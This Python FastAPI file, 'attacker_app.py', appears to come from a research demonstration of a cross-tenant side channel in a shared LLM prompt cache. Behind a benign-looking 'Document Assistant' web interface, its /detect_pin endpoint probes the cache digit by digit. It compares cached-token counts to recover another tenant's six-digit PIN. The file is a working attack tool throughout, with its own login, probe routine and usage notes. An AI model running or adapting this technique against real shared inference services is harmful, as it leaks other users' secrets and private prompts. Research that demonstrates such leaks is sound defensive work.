"""
attacker_app.py — "Document Assistant" (Tenant B / User B)
Port 8002. Zero import of, or reference to, victim_app.py or any secret.

IMPORTANT USAGE NOTE: /detect_pin reads whatever is CURRENTLY in the shared
cache. It does NOT flush mid-probe (flushing would destroy the victim's
cached PIN before comparison). For a clean test: call /flush (via victim
app or curl), have the victim submit, THEN click Detect PIN once. Clicking
Detect PIN repeatedly without a fresh flush+submit cycle will accumulate
noise from prior guesses and degrade results.
"""
import sys, os, secrets
sys.path.insert(0, os.path.dirname(__file__))
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "experiments", "sglang"))

from fastapi import FastAPI, HTTPException, Header
from pydantic import BaseModel
from typing import Optional
from shared_client import send_to_sglang, flush_cache
from config import PIN_LABEL, PIN_SEPARATOR, PIN_TRAILING_MARKER

app = FastAPI(title="Document Assistant (User B)")

SHARED_PUBLIC_PREFIX = (
    "You are a customer support assistant for a cloud infrastructure company. "
    "Below is the internal knowledge base context shared across all support sessions. "
    "Use this context to answer user questions about billing, deployment, and account "
    "management. Always be concise and professional. The following section contains "
    "account-specific context for the current session: "
) * 3

PIN_LENGTH = 6
PLACEHOLDER_DIGIT = "X"  # non-digit, avoids collision with guessing digit '0'

_VALID_USERS = {"user_b": "researcher-controlled-password"}
_sessions = {}

def format_pin(digits: str) -> str:
    return PIN_SEPARATOR.join(list(digits))

def pin_probe(known_prefix: str, guess_digit: str) -> dict:
    remaining = PIN_LENGTH - len(known_prefix) - 1
    guess_digits = known_prefix + guess_digit + PLACEHOLDER_DIGIT * remaining
    prompt = SHARED_PUBLIC_PREFIX + PIN_LABEL + format_pin(guess_digits) + PIN_TRAILING_MARKER
    return send_to_sglang(prompt, cache_salt="tenant_attacker")

class LoginRequest(BaseModel):
    username: str
    password: str

class LoginResponse(BaseModel):
    token: str

class ProbeRequest(BaseModel):
    guess: str

@app.post("/login", response_model=LoginResponse)
def login(req: LoginRequest):
    if _VALID_USERS.get(req.username) != req.password:
        raise HTTPException(status_code=401, detail="invalid credentials")
    token = secrets.token_hex(16)
    _sessions[token] = req.username
    return LoginResponse(token=token)

@app.post("/logout")
def logout(authorization: Optional[str] = Header(None)):
    token = _sessions.pop(authorization, None) and authorization
    return {"logged_out": token is not None}

@app.post("/probe")
def probe(req: ProbeRequest, authorization: Optional[str] = Header(None)):
    if authorization not in _sessions:
        raise HTTPException(status_code=401, detail="not logged in")
    prompt = SHARED_PUBLIC_PREFIX + req.guess
    result = send_to_sglang(prompt, cache_salt="tenant_attacker")
    return {
        "wall_clock_latency": result["wall_clock_latency"],
        "cached_tokens": result["cached_tokens"],
        "prompt_tokens": result["prompt_tokens"],
    }

@app.post("/detect_pin")
def detect_pin(authorization: Optional[str] = Header(None)):
    """Reads current shared cache state via chained per-digit probing.
    Does NOT flush mid-probe - see module docstring for correct usage."""
    if authorization not in _sessions:
        raise HTTPException(status_code=401, detail="not logged in")

    recovered = ""
    per_position_detail = []

    for position in range(PIN_LENGTH):
        best_digit = None
        best_cached = -1
        candidates = []
        for guess in "0123456789":
            r = pin_probe(recovered, guess)
            candidates.append({"guess": guess, "cached_tokens": r["cached_tokens"]})
            if r["cached_tokens"] > best_cached:
                best_cached = r["cached_tokens"]
                best_digit = guess
        per_position_detail.append({"position": position + 1, "candidates": candidates, "chosen": best_digit})
        recovered += best_digit

    return {"recovered_pin": recovered, "detail": per_position_detail}

@app.post("/flush")
def flush():
    return {"flush_result": flush_cache()}

from fastapi.responses import HTMLResponse

@app.get("/", response_class=HTMLResponse)
def attacker_ui():
    return """
    <!DOCTYPE html>
    <html><head><meta charset="utf-8"><title>Document Assistant</title>
    <style>
      * { box-sizing: border-box; margin: 0; padding: 0; }
      body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
             background: #0f172a; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
      .card { background: #fff; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.3);
              width: 380px; overflow: hidden; }
      .header { background: linear-gradient(135deg, #0f766e, #0d9488); color: #fff; padding: 28px 32px; }
      .header .logo { font-size: 13px; font-weight: 600; letter-spacing: 1px; opacity: 0.7; text-transform: uppercase; }
      .header h1 { font-size: 22px; font-weight: 700; margin-top: 6px; }
      .body { padding: 28px 32px 32px; }
      label { display: block; font-size: 13px; font-weight: 600; color: #475569; margin-bottom: 6px; margin-top: 16px; }
      label:first-child { margin-top: 0; }
      input { width: 100%; padding: 11px 14px; border: 1.5px solid #e2e8f0; border-radius: 8px;
              font-size: 14px; outline: none; }
      input:focus { border-color: #0d9488; }
      button { width: 100%; padding: 12px; border: none; border-radius: 8px; font-size: 14px; font-weight: 600;
               cursor: pointer; margin-top: 20px; }
      .btn-primary { background: #0d9488; color: #fff; }
      .btn-detect { background: #0f172a; color: #fff; }
      .btn-flush { background: #f97316; color: #fff; margin-top: 10px; }
      .btn-secondary { background: #f1f5f9; color: #475569; margin-top: 10px; }
      .status-bar { display: flex; align-items: center; gap: 8px; background: #f0fdfa; border: 1px solid #99f6e4;
                    border-radius: 8px; padding: 10px 14px; margin-bottom: 20px; font-size: 13px; color: #0f766e; }
      .dot { width: 8px; height: 8px; border-radius: 50%; background: #14b8a6; }
      .msg { margin-top: 16px; font-size: 14px; color: #1e293b; min-height: 18px; padding: 12px; background: #f8fafc; border-radius: 8px; }
      .result-pin { font-size: 20px; font-weight: 700; letter-spacing: 4px; color: #0f172a; }
      .warn { font-size: 12px; color: #92400e; background: #fef3c7; padding: 8px 10px; border-radius: 6px; margin-top: 12px; }
      .spinner { display: inline-block; width: 12px; height: 12px; border: 2px solid #cbd5e1; border-top-color: #0d9488;
                 border-radius: 50%; animation: spin 0.7s linear infinite; margin-right: 6px; vertical-align: -1px; }
      @keyframes spin { to { transform: rotate(360deg); } }
    </style></head>
    <body>
    <div class="card">
      <div class="header">
        <div class="logo">Tenant B</div>
        <h1>Document Assistant</h1>
      </div>
      <div class="body">
        <div id="login">
          <label>Username</label>
          <input id="u" value="user_b">
          <label>Password</label>
          <input id="p" type="password" value="researcher-controlled-password">
          <button class="btn-primary" onclick="login()">Sign in</button>
        </div>
        <div id="app" style="display:none;">
          <div class="status-bar"><span class="dot"></span> Signed in as user_b</div>
          <label>Probe text</label>
          <input id="guess" value="unknown guess">
          <button class="btn-primary" onclick="probe()">Send probe</button>
          <button class="btn-detect" onclick="detectPin()">Detect PIN</button>
          <button class="btn-secondary" onclick="logout()">Sign out</button>
          <div class="warn">For a clean test: flush cache, have victim submit, then click Detect PIN once. Repeated clicks without a fresh flush+submit will degrade results.</div>
          <div class="msg" id="msg" style="display:none;"></div>
        </div>
      </div>
    </div>
    <script>
    let token = null;
    async function login() {
      const r = await fetch('/login', {method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({username: document.getElementById('u').value, password: document.getElementById('p').value})});
      if (r.ok) {
        token = (await r.json()).token;
        document.getElementById('login').style.display = 'none';
        document.getElementById('app').style.display = 'block';
      } else { alert('Login failed'); }
    }
    async function probe() {
      const r = await fetch('/probe', {method:'POST', headers:{'Content-Type':'application/json','Authorization':token},
        body: JSON.stringify({guess: document.getElementById('guess').value})});
      const d = await r.json();
      const msg = document.getElementById('msg');
      msg.style.display = 'block';
      msg.innerHTML = 'cached_tokens: <b>' + d.cached_tokens + ' / ' + d.prompt_tokens + '</b>';
    }
    async function detectPin() {
      const msg = document.getElementById('msg');
      msg.style.display = 'block';
      msg.innerHTML = '<span class="spinner"></span>Detecting, please wait...';
      const r = await fetch('/detect_pin', {method:'POST', headers:{'Authorization':token}});
      const d = await r.json();
      msg.innerHTML = 'Recovered PIN<br><span class="result-pin">' + d.recovered_pin + '</span>';
    }
    async function logout() {
      await fetch('/logout', {method:'POST', headers:{'Authorization':token}});
      token = null;
      document.getElementById('app').style.display = 'none';
      document.getElementById('login').style.display = 'block';
      document.getElementById('msg').style.display = 'none';
    }
    </script>
    </body></html>
    """
